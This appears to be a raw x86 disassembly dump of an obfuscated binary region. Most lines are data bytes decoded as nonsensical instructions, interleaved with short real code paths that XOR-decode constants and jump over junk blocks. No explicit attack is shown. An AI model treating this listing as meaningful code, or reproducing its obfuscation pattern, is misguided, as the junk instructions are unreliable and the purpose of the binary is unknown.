  420d0e:	fdivr  st,st(5)
  420d10:	aad    0xfa
  420d12:	rcr    DWORD PTR [esi+0x450dc7cc],cl
  420d18:	imul   esp,DWORD PTR [esi+0x7c9cc342],0xd
  420d1f:	xor    DWORD PTR [ebp+0x6ae77b26],edx
  420d25:	out    dx,eax
  420d26:	cwde   
  420d27:	mov    fs,WORD PTR [edx]
  420d29:	pop    edx
  420d2a:	jecxz  0x420ce3
  420d2c:	call   0x1ab4:0x67498431
  420d33:	std    
  420d34:	and    cl,BYTE PTR [ebx-0x4e]
  420d37:	loope  0x420cff
  420d39:	(bad)  
  420d3a:	pushf  
  420d3b:	mov    ebx,fs
  420d3d:	aas    
  420d3e:	add    eax,0x9bd7f473
  420d43:	ins    DWORD PTR es:[edi],dx
  420d44:	scas   al,BYTE PTR es:[edi]
  420d45:	xor    ah,dl
  420d47:	xor    eax,edx
  420d49:	xchg   edi,eax
  420d4a:	das    
  420d4b:	mov    esi,DWORD PTR [esi+0x4de45c53]
  420d51:	in     eax,dx
  420d52:	test   eax,0xbbbeb9b1
  420d57:	mov    gs,WORD PTR [ebp+0x7eea017e]
  420d5d:	mov    dl,0x7a
  420d5f:	fstp   DWORD PTR [edx-0x29ddb49f]
  420d65:	dec    ecx
  420d66:	dec    ebp
  420d67:	mov    WORD PTR [edi+esi*1+0x49],?
  420d6b:	or     al,0x3f
  420d6d:	test   BYTE PTR ds:[edx],ah
  420d70:	dec    esp
  420d71:	push   ebp
  420d72:	sub    BYTE PTR [edi+0x3d850614],cl
  420d78:	(bad)  
  420d79:	cmp    al,0xbd
  420d7b:	mov    dh,0xf
  420d7d:	lahf   
  420d7e:	gs jae 0x420deb
  420d81:	dec    esp
  420d82:	dec    esp
  420d83:	dec    edx
  420d84:	push   ecx
  420d85:	jns    0x420d8d
  420d87:	mov    DWORD PTR [ecx+0x40],ecx
  420d8a:	cwde   
  420d8b:	lock jno 0x420d14
  420d8e:	push   ebx
  420d8f:	mov    cl,0x2
  420d91:	jp     0x420d62
  420d93:	fld    QWORD PTR [ebx-0x429b8eef]
  420d99:	popf   
  420d9a:	loope  0x420dbc
  420d9c:	push   edi
  420d9d:	pop    ebx
  420d9e:	mov    ds:0x43affb5c,eax
  420da3:	xor    dh,BYTE PTR [esi]
  420da5:	aam    0xc9
  420da7:	push   ss
  420da8:	out    0x19,al
  420daa:	mov    eax,ds:0x360fb368
  420daf:	xchg   ecx,esi
  420db1:	mov    ebp,0x863699b0
  420db6:	sbb    al,BYTE PTR [eax+eiz*4-0x1d]
  420dba:	and    al,0xc2
  420dbc:	xor    DWORD PTR [ecx],esi
  420dbe:	push   edi
  420dbf:	push   ecx
  420dc0:	dec    edi
  420dc1:	mov    dh,0xa2
  420dc3:	sub    eax,0x2bf8c122
  420dc8:	mov    edi,0xae1b29d1
  420dcd:	pop    ss
  420dce:	pusha  
  420dcf:	into   
  420dd0:	pop    ds
  420dd1:	in     eax,dx
  420dd2:	push   ebx
  420dd3:	icebp  
  420dd4:	pop    ebx
  420dd5:	xchg   BYTE PTR [ebx-0x20],dh
  420dd8:	rol    DWORD PTR ss:[ebp-0x35],0xc3
  420ddd:	jae    0x420da9
  420ddf:	xchg   DWORD PTR [edi+0x15837521],ebp
  420de5:	xor    al,BYTE PTR [edx-0x33cd25d1]
  420deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dec:	fsub   st,st(3)
  420dee:	das    
  420def:	push   0x35
  420df1:	jb     0x420db0
  420df3:	stos   BYTE PTR es:[edi],al
  420df4:	std    
  420df5:	test   al,0x29
  420df7:	jno    0x420e1b
  420df9:	jae    0x420d89
  420dfb:	outs   dx,DWORD PTR ds:[esi]
  420dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dfd:	dec    ecx
  420dfe:	pop    ebp
  420dff:	dec    ebp
  420e00:	or     eax,0x9d48d015
  420e05:	dec    ebx
  420e06:	imul   edi,DWORD PTR [edx],0x3234895b
  420e0c:	inc    eax
  420e0d:	aam    0xf9
  420e0f:	mov    ebx,0xa835f692
  420e14:	imul   eax,DWORD PTR [ebp+0x5fffbe2a],0x46
  420e1b:	fstp   QWORD PTR [esi]
  420e1d:	jle    0x420df1
  420e1f:	js     0x420e50
  420e21:	fstp   st(4)
  420e23:	sahf   
  420e24:	cmp    al,0xe2
  420e26:	push   edi
  420e27:	les    esi,FWORD PTR [eax]
  420e29:	jno    0x420db3
  420e2b:	fidivr DWORD PTR [ebp+0x6d]
  420e2e:	xchg   ecx,eax
  420e2f:	mov    ecx,0x3afee300
  420e34:	rcl    DWORD PTR [edx+0x69],1
  420e37:	lds    esp,FWORD PTR [ebp+0x54]
  420e3a:	dec    ebp
  420e3b:	sbb    esi,DWORD PTR ds:0x1054162d
  420e41:	sti    
  420e42:	cmp    cl,cl
  420e44:	gs jp  0x420e6a
  420e47:	xor    eax,0x8e8a6d88
  420e4c:	das    
  420e4d:	(bad)  
  420e4e:	ds clc 
  420e50:	cmp    eax,0x6c075efc
  420e55:	pop    ss
  420e56:	fst    DWORD PTR [ebx]
  420e58:	cwde   
  420e59:	mov    esi,0x19677ee4
  420e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e5f:	clc    
  420e60:	ret    0x5a63
  420e63:	add    al,0x6e
  420e65:	repnz pop ds
  420e67:	mov    esp,0x689e7334
  420e6c:	sbb    eax,esp
  420e6e:	test   DWORD PTR [ebx-0x18],edx
  420e71:	fidivr WORD PTR [ebx+0x1e497a18]
  420e77:	(bad)  
  420e78:	jae    0x420ee9
  420e7a:	mov    al,ds:0xf186405b
  420e7f:	(bad)  
  420e80:	pop    eax
  420e81:	int3   
  420e82:	xchg   ebx,eax
  420e83:	pop    edi
  420e84:	adc    eax,0xe19fb2a5
  420e89:	ins    BYTE PTR es:[edi],dx
  420e8a:	popf   
  420e8b:	sar    DWORD PTR [ebp-0x255f1db9],0xdb
  420e92:	cmp    esi,DWORD PTR [esi+0x6df2dde9]
  420e98:	mov    cl,0x80
  420e9a:	repnz fs fwait
  420e9d:	int3   
  420e9e:	xor    bh,BYTE PTR [eax-0x57]
  420ea1:	mov    ebp,0xfb8a2c1d
  420ea6:	adc    ah,BYTE PTR [esi]
  420ea8:	sub    ebx,DWORD PTR [ecx-0x543777d6]
  420eae:	ins    BYTE PTR es:[edi],dx
  420eaf:	xor    eax,DWORD PTR ds:0xae24860d
  420eb5:	test   DWORD PTR [ecx+ecx*8+0x5b],eax
  420eb9:	inc    edx
  420eba:	call   0xc3fb7feb
  420ebf:	xlat   BYTE PTR ds:[ebx]
  420ec0:	(bad)  
  420ec1:	cmp    DWORD PTR [eax-0x1245ae93],edi
  420ec7:	mov    gs,esp
  420ec9:	fstp   QWORD PTR [esi-0x4b]
  420ecc:	js     0x420e7c
  420ece:	push   esp
  420ecf:	add    BYTE PTR [edi-0x10],ah
  420ed2:	dec    edx
  420ed3:	mov    eax,DWORD PTR [eax+eiz*4+0x7f]
  420ed7:	xchg   esi,eax
  420ed8:	cli    
  420ed9:	mov    edi,0xc80b503f
  420ede:	mov    ds:0x3563b744,eax
  420ee3:	jmp    0x837baf2e
  420ee8:	mov    WORD PTR [ebx+0x13],gs
  420eeb:	or     edi,edx
  420eed:	(bad)  
  420eef:	es push ss
  420ef1:	jg     0x420ef7
  420ef3:	mov    al,0xab
  420ef5:	bound  ebp,QWORD PTR [esi-0x3d9ac3ec]
  420efb:	or     al,0x51
  420efd:	retf   
  420efe:	cmp    bh,bl
  420f00:	out    dx,eax
  420f01:	std    
  420f02:	stos   BYTE PTR es:[edi],al
  420f03:	mov    al,0xb5
  420f05:	bound  esi,QWORD PTR [edx+0x1a]
  420f08:	pop    edi
  420f09:	je     0x420e97
  420f0b:	enter  0x3ad6,0x44
  420f0f:	ror    esp,cl
  420f11:	int3   
  420f12:	pop    ss
  420f13:	cld    
  420f14:	sti    
  420f15:	mov    al,0x8e
  420f17:	pop    eax
  420f18:	adc    DWORD PTR [ecx],ecx
  420f1a:	and    al,0xff
  420f1c:	sar    DWORD PTR [ebp-0x6eb523c5],cl
  420f22:	jecxz  0x420ef8
  420f24:	das    
  420f25:	sub    DWORD PTR [eax],edi
  420f27:	fbld   TBYTE PTR [edx]
  420f29:	fs (bad) 
  420f2b:	xor    dh,BYTE PTR [edi]
  420f2d:	adc    eax,0x366f10d4
  420f32:	add    al,0x7b
  420f34:	xchg   edi,eax
  420f35:	call   0xde1f:0x863fdcc0
  420f3c:	sub    DWORD PTR [esi+edi*1-0x53],0x22
  420f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f42:	jl     0x420ef5
  420f44:	int    0xe1
  420f46:	ror    DWORD PTR [ecx-0x32],1
  420f49:	xchg   ebp,eax
  420f4a:	mov    bh,0x20
  420f4c:	sbb    dh,BYTE PTR [esi]
  420f4e:	fdivr  QWORD PTR [esi+0x3c8c7fd7]
  420f54:	push   esp
  420f55:	popa   
  420f56:	out    0xed,eax
  420f58:	dec    esp
  420f59:	into   
  420f5a:	cdq    
  420f5b:	push   esp
  420f5c:	xchg   ecx,eax
  420f5d:	jmp    0xb2b3:0x7c219a88
  420f64:	inc    esp
  420f65:	jne    0x420f38
  420f67:	hlt    
  420f68:	and    dl,cl
  420f6a:	add    BYTE PTR [esi+0x5f8eb5cf],cl
  420f70:	cmp    ecx,DWORD PTR [eax+0x18]
  420f73:	je     0x422170
  420f79:	mov    eax,DWORD PTR [ebp-0x144]
  420f7f:	mov    ecx,DWORD PTR [ebp-0x38]
  420f82:	mov    edx,DWORD PTR [ebp+0x8]
  420f85:	add    edx,DWORD PTR [ecx+eax*4]
  420f88:	mov    DWORD PTR [ebp-0x48],edx
  420f8b:	mov    eax,DWORD PTR [ebp-0x48]
  420f8e:	mov    DWORD PTR [ebp-0x210],eax
  420f94:	mov    eax,DWORD PTR [ebp+0xc]
  420f97:	mov    DWORD PTR [ebp-0x20c],eax
  420f9d:	mov    DWORD PTR [ebp-0x1f0],0xcb79b576
  420fa7:	mov    DWORD PTR [ebp-0x1ec],0x9c2b8ae8
  420fb1:	mov    DWORD PTR [ebp-0x1e0],0xcb79b572
  420fbb:	mov    DWORD PTR [ebp-0x1dc],0x9c2b8ae8
  420fc5:	lea    eax,[ebp-0x1e8]
  420fcb:	mov    DWORD PTR [ebp-0x1f4],eax
  420fd1:	mov    eax,DWORD PTR [ebp-0x20c]
  420fd7:	movzx  eax,WORD PTR [eax+0x20]
  420fdb:	xor    eax,0xa59b
  420fe0:	movzx  eax,ax
  420fe3:	sar    eax,1
  420fe5:	mov    ecx,DWORD PTR [ebp-0x20c]
  420feb:	movzx  ecx,WORD PTR [ecx+0x20]
  420fef:	xor    ecx,0xa59b
  420ff5:	movzx  ecx,cx
  420ff8:	shl    ecx,0xf
  420ffb:	or     eax,ecx
  420ffd:	movzx  eax,ax
  421000:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421006:	mov    DWORD PTR [ecx],eax
  421008:	mov    eax,DWORD PTR [ebp-0x1e0]
  42100e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421014:	xor    eax,0xcb79b576
  421019:	xor    edx,0x9c2b8ae8
  42101f:	mov    cl,0x2
  421021:	call   0x408bb8
  421026:	mov    ebx,eax
  421028:	mov    esi,edx
  42102a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421030:	mov    edx,DWORD PTR [ebp-0x1dc]
  421036:	xor    eax,0xcb79b576
  42103b:	jmp    0x421422
  421040:	xchg   ebp,eax
  421041:	or     ebp,DWORD PTR ds:0x9a3cb322
  421047:	mov    esp,0x90cf9e52
  42104c:	mov    ds:0x93d16a5f,eax
  421051:	mov    bl,0xc0
  421053:	mov    esi,0xbebec44a
  421058:	jge    0x4210cc
  42105a:	jnp    0x421035
  42105c:	mov    bh,0x22
  42105e:	pop    edi
  42105f:	xor    esi,DWORD PTR [ebx+0x7b]
  421062:	xlat   BYTE PTR ds:[ebx]
  421063:	test   al,0xd9
  421065:	mov    ebp,0xf6f139fc
  42106a:	ficom  WORD PTR [esi-0x25ef15ee]
  421070:	shl    DWORD PTR [ebx-0x69],1
  421073:	scas   al,BYTE PTR es:[edi]
  421074:	xchg   ecx,eax
  421075:	aaa    
  421076:	push   0x1d
  421078:	mov    eax,ds:0xaf23c888
  42107d:	call   0x55fe:0x290c23c4
  421084:	mov    cl,0x94
  421086:	seto   BYTE PTR [eax-0x66324cac]
  42108d:	xor    eax,0xa5482462
  421092:	hlt    
  421093:	shr    BYTE PTR [esp+edi*2-0xe],1
  421097:	(bad)  
  421098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421099:	sbb    dh,BYTE PTR [edi+ebx*1]
  42109c:	sub    BYTE PTR [eax+0x25],dh
  42109f:	push   ecx
  4210a0:	leave  
  4210a1:	xor    BYTE PTR [edx+0x62330aab],ah
  4210a7:	and    eax,0x4fc51404
  4210ac:	and    BYTE PTR [ebp+0x6b],ah
  4210af:	sub    eax,0x4396f26c
  4210b4:	push   ebx
  4210b5:	mov    esi,0x533d201
  4210ba:	adc    dh,bl
  4210bc:	sti    
  4210bd:	(bad)  [eax]
  4210bf:	sub    BYTE PTR ds:0x558f401a,bl
  4210c5:	rcl    DWORD PTR [esi],0x46
  4210c8:	(bad)  
  4210c9:	(bad)  
  4210cb:	lahf   
  4210cc:	out    dx,eax
  4210cd:	jb     0x421077
  4210cf:	loopne 0x4210d3
  4210d1:	ins    BYTE PTR es:[edi],dx
  4210d2:	(bad)  
  4210d3:	clc    
  4210d4:	xor    DWORD PTR [ebx],esi
  4210d6:	jl     0x421113
  4210d8:	inc    ecx
  4210d9:	jmp    0x77ed616b
  4210de:	cmp    cl,BYTE PTR [edx-0x2d]
  4210e1:	pushf  
  4210e2:	and    dl,BYTE PTR [edi+0x66]
  4210e5:	icebp  
  4210e6:	mov    ecx,0x75d1ca60
  4210eb:	jno    0x42107d
  4210ed:	sti    
  4210ee:	add    DWORD PTR [ebp+0x4],0x7fec8ec5
  4210f5:	std    
  4210f6:	mov    edx,0x3e88a9c7
  4210fb:	mov    edx,0xa3c5b2b5
  421100:	ss pop ebx
  421102:	mov    ecx,0xcfb4aa63
  421107:	xchg   BYTE PTR [ebx-0x4b99328c],dl
  42110d:	sub    BYTE PTR [edx+0x7b20e02b],bl
  421113:	mov    ecx,0x6d9c74d7
  421118:	push   edx
  421119:	minps  xmm2,XMMWORD PTR [edx+0x81a8ecc]
  421120:	adc    ch,BYTE PTR [eax+0x67]
  421123:	jge    0x421165
  421125:	sbb    ch,al
  421127:	mov    ds:0x3270c8e9,al
  42112c:	arpl   WORD PTR [esi-0x4de9efa6],si
  421132:	and    al,BYTE PTR [esi+0x60f1c27e]
  421138:	push   ebp
  421139:	data16 xor bl,ch
  42113c:	xchg   DWORD PTR ds:0xd10eacab,esi
  421142:	xor    DWORD PTR [ebp+0x2c],ecx
  421145:	push   edx
  421146:	push   eax
  421147:	enter  0xfd61,0x3e
  42114b:	out    0x4c,eax
  42114d:	pop    edi
  42114e:	and    ebx,eax
  421150:	pop    ss
  421151:	xchg   DWORD PTR [ebp-0x15],edi
  421154:	mov    BYTE PTR [eax],ah
  421156:	mov    esp,0x9e40be47
  42115b:	adc    al,0xe0
  42115d:	pop    ds
  42115e:	jecxz  0x4211c4
  421160:	js     0x421134
  421162:	aad    0x4d
  421164:	lds    ebx,FWORD PTR [eax-0x30c80d6d]
  42116a:	inc    edi
  42116b:	push   ecx
  42116c:	(bad)  
  42116d:	aam    0xa8
  42116f:	out    dx,al
  421170:	xchg   edx,eax
  421171:	cdq    
  421172:	mov    edi,0xac72ab78
  421177:	jno    0x42110c
  421179:	mov    dl,0xf1
  42117b:	jg     0x4211e1
  42117d:	push   edi
  42117e:	ds xchg esi,eax
  421180:	hlt    
  421181:	cmp    bl,BYTE PTR ds:0x22a6d4c2
  421187:	mov    ah,0xde
  421189:	mov    ch,0xfd
  42118b:	xchg   ecx,eax
  42118c:	adc    eax,0xea2aa8c1
  421191:	pop    es
  421192:	add    al,0x85
  421194:	inc    ebx
  421195:	mov    eax,0x3de071d
  42119a:	mov    DWORD PTR [edx-0x640319e5],esp
  4211a0:	push   esi
  4211a1:	lods   al,BYTE PTR ds:[esi]
  4211a2:	pop    esp
  4211a3:	gs add edi,ebx
  4211a6:	retf   
  4211a7:	gs push 0x1b
  4211aa:	xchg   esp,eax
  4211ab:	fs cld 
  4211ad:	inc    esi
  4211ae:	lods   eax,DWORD PTR ds:[esi]
  4211af:	xchg   ecx,eax
  4211b0:	sbb    BYTE PTR [ecx-0x29aed64b],dh
  4211b6:	pop    ebx
  4211b7:	push   ebx
  4211b8:	inc    edx
  4211b9:	mov    ecx,DWORD PTR [eax-0x14]
  4211bc:	dec    edx
  4211bd:	xchg   esi,eax
  4211be:	sub    BYTE PTR [ebx-0x190cdb93],bl
  4211c4:	xchg   edx,eax
  4211c5:	inc    esp
  4211c6:	push   ecx
  4211c7:	adc    al,0x16
  4211c9:	mov    ds:0x66973f66,al
  4211ce:	cmp    eax,0x9e8977fa
  4211d3:	inc    ecx
  4211d4:	out    dx,eax
  4211d5:	xlat   BYTE PTR ds:[ebx]
  4211d6:	dec    eax
  4211d7:	xchg   ebp,eax
  4211d8:	xor    al,0xc6
  4211da:	retf   0x49de
  4211dd:	sahf   
  4211de:	test   eax,0x77757e6b
  4211e3:	mov    bl,0xb6
  4211e5:	or     edi,DWORD PTR [ebx+esi*4+0xb]
  4211e9:	fisub  DWORD PTR [esi]
  4211eb:	addr16 (bad) 
  4211ed:	icebp  
  4211ee:	retf   
  4211ef:	das    
  4211f0:	stc    
  4211f1:	ss pop ebp
  4211f3:	out    dx,al
  4211f4:	sbb    al,0x2f
  4211f6:	(bad)  
  4211f7:	pop    ecx
  4211f8:	test   eax,0x527357e6
  4211fd:	imul   ebp,DWORD PTR [edx],0xffffff97
  421200:	sbb    BYTE PTR [edi-0x56f83be7],0xd
  421207:	out    dx,eax
  421208:	xlat   BYTE PTR ds:[ebx]
  421209:	jae    0x4211d2
  42120b:	lock mov ah,0x5c
  42120e:	cli    
  42120f:	mov    ebp,DWORD PTR [edx+0x6f]
  421212:	rcl    BYTE PTR fs:0x768228cb,cl
  421219:	and    DWORD PTR [eax+eax*1-0x62f4a468],0x115e37a4
  421224:	dec    ecx
  421225:	xchg   edi,eax
  421226:	retf   
  421227:	bound  ecx,QWORD PTR [ebx]
  421229:	cmc    
  42122a:	cmp    BYTE PTR [ebx+0x4ab2c55c],0x61
  421231:	outs   dx,WORD PTR ds:[si]
  421234:	jo     0x421294
  421236:	ja     0x42123a
  421238:	push   0x877a5f40
  42123d:	pop    eax
  42123e:	mov    WORD PTR ds:0x3c2bc97b,es
  421244:	sbb    DWORD PTR [esi+0x2],edx
  421247:	pop    edi
  421248:	dec    edi
  421249:	cld    
  42124a:	sub    cl,BYTE PTR ds:0xb60801fd
  421250:	jbe    0x421242
  421252:	fcmovnb st,st(3)
  421254:	push   cs
  421255:	cmp    DWORD PTR [ebp+0x0],ebp
  421258:	xor    ch,BYTE PTR [edx-0x73816831]
  42125e:	fidiv  DWORD PTR [edx-0x77]
  421261:	mov    edx,0x3bb1095
  421266:	or     DWORD PTR [esi+0x6f],eax
  421269:	and    ah,ch
  42126b:	jl     0x421271
  42126d:	dec    ecx
  42126e:	sub    DWORD PTR [eax],0xffffffc9
  421271:	ror    ecx,0x1e
  421274:	inc    esi
  421275:	sub    cl,BYTE PTR [edi+0x7f]
  421278:	inc    esi
  421279:	fs cld 
  42127b:	jge    0x4212a9
  42127d:	es repnz loopne 0x4212e4
  421281:	push   ds
  421282:	addr16 rcl edi,0xb2
  421286:	xlat   BYTE PTR ds:[ebx]
  421287:	lock repz xchg esi,eax
  42128a:	pop    edi
  42128b:	or     al,BYTE PTR [edi+0x25fcbb86]
  421291:	out    dx,eax
  421292:	and    al,0x61
  421294:	enter  0xfe7a,0xd7
  421298:	push   esi
  421299:	fcomip st,st(1)
  42129b:	pop    eax
  42129c:	sbb    DWORD PTR [ebx+0x284eedff],eax
  4212a2:	add    ah,BYTE PTR [edx+0x14]
  4212a5:	sub    BYTE PTR [esi-0x56],0x63
  4212a9:	dec    ebx
  4212aa:	data16 mov ds:0x97f4e73,al
  4212b0:	ficom  DWORD PTR [ebx+0x5d]
  4212b3:	icebp  
  4212b4:	mov    dl,0x9b
  4212b6:	test   BYTE PTR [eax],ch
  4212b8:	cmp    cl,BYTE PTR [esi+0x60731cd5]
  4212be:	retf   0x21ce
  4212c1:	sub    DWORD PTR [ebp+ebx*4+0x41],esi
  4212c5:	xchg   edi,eax
  4212c6:	hlt    
  4212c7:	xlat   BYTE PTR ds:[ebx]
  4212c8:	mov    al,ds:0xd52a96fb
  4212cd:	push   ebx
  4212ce:	dec    ebp
  4212cf:	jne    0x421267
  4212d1:	push   edx
  4212d2:	add    ebp,DWORD PTR [ebx+0x6620e08d]
  4212d8:	mov    eax,ds:0xaa3cd930
  4212dd:	std    
  4212de:	gs (bad) 
  4212e1:	cwde   
  4212e2:	call   0x4c1a:0xca9f57aa
  4212e9:	mov    esp,0x4ff0f02f
  4212ee:	adc    edi,DWORD PTR [esi+0x6208a9d3]
  4212f4:	adc    al,0xbb
  4212f6:	or     BYTE PTR [edi],dh
  4212f8:	stos   DWORD PTR es:[edi],eax
  4212f9:	push   esp
  4212fa:	test   DWORD PTR [esi],ebx
  4212fc:	adc    BYTE PTR [ebx],0x6c
  4212ff:	loop   0x421319
  421301:	jbe    0x421346
  421303:	ret    
  421304:	adc    ecx,DWORD PTR [eax-0x34]
  421307:	add    eax,0x44dc9a14
  42130c:	push   esp
  42130d:	xchg   ebx,eax
  42130e:	imul   esp,DWORD PTR [eax-0x23],0xffffffa5
  421312:	push   ss
  421313:	out    0x9b,al
  421315:	imul   edx,DWORD PTR [edi+0x27],0xffffffc0
  421319:	add    esp,DWORD PTR [edx]
  42131b:	pop    esi
  42131c:	jecxz  0x42131b
  42131e:	adc    ebp,DWORD PTR [ebx-0x68f6a835]
  421324:	icebp  
  421325:	jp     0x42131b
  421327:	sub    al,0x9f
  421329:	rcl    eax,cl
  42132b:	sub    eax,0xdde1ad5f
  421330:	cdq    
  421331:	xor    ah,BYTE PTR [ebp+0x20]
  421334:	pop    es
  421335:	stos   BYTE PTR es:[edi],al
  421336:	inc    ebx
  421337:	stos   BYTE PTR es:[edi],al
  421338:	pop    ebp
  421339:	mov    esi,0x67d08920
  42133e:	inc    ecx
  42133f:	pop    ebx
  421340:	cmp    eax,0x2058fa14
  421345:	arpl   WORD PTR [ecx+0x7aba9282],cx
  42134b:	sbb    al,dl
  42134d:	inc    edi
  42134e:	pop    esp
  42134f:	test   DWORD PTR [edi],edx
  421351:	ror    ah,0xb5
  421354:	inc    eax
  421355:	push   ebx
  421356:	mov    al,0x8b
  421358:	push   0xffffffc8
  42135a:	inc    eax
  42135b:	fld    QWORD PTR [ebp+eax*8+0x310c6cea]
  421362:	jge    0x4213aa
  421364:	mov    edx,DWORD PTR [edx-0x5ce9a3ca]
  42136a:	mov    ds:0xa916ae97,eax
  42136f:	rcl    BYTE PTR [ecx+0x5a],cl
  421372:	jle    0x42132f
  421374:	test   al,0xe6
  421376:	inc    esp
  421377:	jo     0x4213e2
  421379:	and    al,0x2a
  42137b:	pusha  
  42137c:	and    ch,BYTE PTR [ecx+0x7d]
  42137f:	fs jo  0x4213ee
  421382:	popa   
  421383:	jge    0x42138a
  421385:	(bad)  
  421387:	lds    ebp,FWORD PTR [ebx+0x62]
  42138a:	jmp    0x5f75:0xbcf511ac
  421391:	sti    
  421392:	sbb    eax,0x4787d933
  421397:	outs   dx,BYTE PTR ds:[esi]
  421398:	push   0x45
  42139a:	mov    ds:0x974313be,al
  42139f:	dec    ebp
  4213a0:	jmp    0x8091:0xad7fd09b
  4213a7:	jmp    0x4213bf
  4213a9:	scas   eax,DWORD PTR es:[edi]
  4213aa:	or     esi,0x4
  4213ad:	data16 lahf 
  4213af:	or     eax,0x79e25c32
  4213b4:	jnp    0x4213b9
  4213b6:	out    0xde,al
  4213b8:	fcmovne st,st(0)
  4213ba:	sbb    DWORD PTR [edi-0x6b7f445b],0xffffffe7
  4213c1:	je     0x4213af
  4213c3:	inc    ebp
  4213c4:	out    0xcd,eax
  4213c6:	or     dh,BYTE PTR [ebx+0x1c]
  4213c9:	mov    edi,0xee55f92f
  4213ce:	test   eax,0x40a608fd
  4213d3:	cmc    
  4213d4:	stos   BYTE PTR es:[edi],al
  4213d5:	in     eax,dx
  4213d6:	push   esi
  4213d7:	shl    BYTE PTR [ecx+0x4dee2001],cl
  4213dd:	sub    al,0x66
  4213df:	int    0xe8
  4213e1:	in     al,0x16
  4213e3:	(bad)  
  4213e5:	jne    0x421394
  4213e7:	aad    0x58
  4213e9:	jo     0x421443
  4213eb:	xchg   BYTE PTR [ecx-0xf],dl
  4213ee:	and    eax,0xbdd1f699
  4213f3:	adc    BYTE PTR [ebx],bh
  4213f5:	mov    edi,0x9a200a92
  4213fa:	jnp    0x4213f3
  4213fc:	dec    ebx
  4213fd:	push   cs
  4213fe:	dec    esi
  4213ff:	or     BYTE PTR [eax],cl
  421401:	lahf   
  421402:	push   ss
  421403:	test   al,0x3c
  421405:	push   ss
  421406:	test   al,0x20
  421408:	dec    edi
  421409:	mov    ebx,0x2c1ec0a1
  42140e:	add    ebx,ebx
  421410:	push   edi
  421411:	adc    edi,ecx
  421413:	jb     0x4213b2
  421415:	cmp    DWORD PTR [edx+0x220386f4],esp
  42141b:	adc    edi,0x2488c7c1
  421421:	stos   BYTE PTR es:[edi],al
  421422:	xor    edx,0x9c2b8ae8
  421428:	mov    cl,0x3e
  42142a:	call   0x4223ad
  42142f:	or     ebx,eax
  421431:	or     esi,edx
  421433:	movzx  eax,bl
  421436:	push   eax
  421437:	lea    eax,[ebp-0x198]
  42143d:	push   eax
  42143e:	call   0x415a09
  421443:	mov    eax,DWORD PTR [ebp-0x1f0]
  421449:	mov    edx,DWORD PTR [ebp-0x1ec]
  42144f:	xor    eax,0xcb79b576
  421454:	xor    edx,0x9c2b8ae8
  42145a:	mov    cl,0x2
  42145c:	call   0x408bb8
  421461:	mov    esi,eax
  421463:	mov    edi,edx
  421465:	mov    eax,DWORD PTR [ebp-0x1f0]
  42146b:	jmp    0x421852
  421470:	out    0xc8,eax
  421472:	push   esi
  421473:	sub    esi,DWORD PTR [esi-0x44]
  421476:	mov    esp,0xfcb5630c
  42147b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42147c:	into   
  42147d:	aas    
  42147e:	or     dl,BYTE PTR [edx-0x413f44e1]
  421484:	dec    edx
  421485:	les    edi,FWORD PTR [esi-0x30b2842]
  42148b:	fcomp  QWORD PTR [eax-0x70]
  42148e:	sar    DWORD PTR [edi-0x3],1
  421491:	inc    ebx
  421492:	fmul   DWORD PTR [ecx+0x262d9f53]
  421498:	popa   
  421499:	shl    BYTE PTR [ebp+0x30052a64],cl
  42149f:	pop    ds
  4214a0:	add    eax,0x3cefd00d
  4214a5:	adc    bh,ch
  4214a7:	dec    eax
  4214a8:	fsubr  st,st(3)
  4214aa:	mov    bl,0xe9
  4214ac:	jp     0x4214c4
  4214ae:	pushf  
  4214af:	cmp    al,0x60
  4214b1:	mov    dh,0x5a
  4214b3:	mov    al,ds:0x8e64d11a
  4214b8:	fwait
  4214b9:	(bad)  
  4214ba:	shl    BYTE PTR [ebx-0x7153c791],1
  4214c0:	mov    ecx,ebp
  4214c2:	xchg   BYTE PTR [ebx-0x2cd9609e],ch
  4214c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214c9:	daa    
  4214ca:	mov    esi,0x54f24ffe
  4214cf:	dec    eax
  4214d0:	lock jge 0x421511
  4214d3:	and    BYTE PTR [edx-0x6e22b5c1],0x5b
  4214da:	clc    
  4214db:	dec    ebx
  4214dc:	mov    dl,0x1f
  4214de:	xchg   ebx,ecx
  4214e0:	popw   ds
  4214e2:	mov    eax,DWORD PTR [esi]
  4214e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214e5:	ja     0x42153e
  4214e7:	cs out dx,eax
  4214e9:	ins    BYTE PTR es:[edi],dx
  4214ea:	xor    BYTE PTR [ebx],bl
  4214ec:	std    
  4214ed:	shl    DWORD PTR [edi+0x1c0e3680],1
  4214f3:	(bad)  
  4214f5:	lods   al,BYTE PTR ds:[esi]
  4214f6:	dec    ebx
  4214f7:	data16 js 0x4214be
  4214fa:	cmp    eax,0x428685f5
  4214ff:	inc    ebx
  421500:	or     BYTE PTR [eax+0xa],bl
  421503:	loope  0x4214d9
  421505:	test   eax,0xe0b34836
  42150a:	push   0xf13cd2f6
  42150f:	aad    0x8e
  421511:	pop    esi
  421512:	int3   
  421513:	in     eax,dx
  421514:	jo     0x4214f2
  421516:	and    ch,BYTE PTR [ebp-0x27]
  421519:	sbb    ebp,ebx
  42151b:	pop    esp
  42151c:	xor    eax,0xae23cca2
  421521:	es fs jecxz 0x42158a
  421525:	popa   
  421526:	pop    eax
  421527:	aaa    
  421528:	mov    esp,DWORD PTR [eax]
  42152a:	mov    eax,0x6dfa0616
  42152f:	aaa    
  421530:	stc    
  421531:	and    al,0xc5
  421533:	mov    al,0xb
  421535:	mov    ds:0xc8edc6f7,al
  42153a:	jnp    0x421542
  42153c:	and    esp,ebx
  42153e:	jp     0x4214dc
  421540:	es and al,0x3
  421543:	scas   eax,DWORD PTR es:[edi]
  421544:	ins    DWORD PTR es:[edi],dx
  421545:	fs sub cl,cl
  421548:	xchg   esi,eax
  421549:	call   0x3a0a:0x51a67817
  421550:	les    edi,FWORD PTR [ecx]
  421552:	(bad)  
  421553:	adc    cl,BYTE PTR [ebp+0x180735c2]
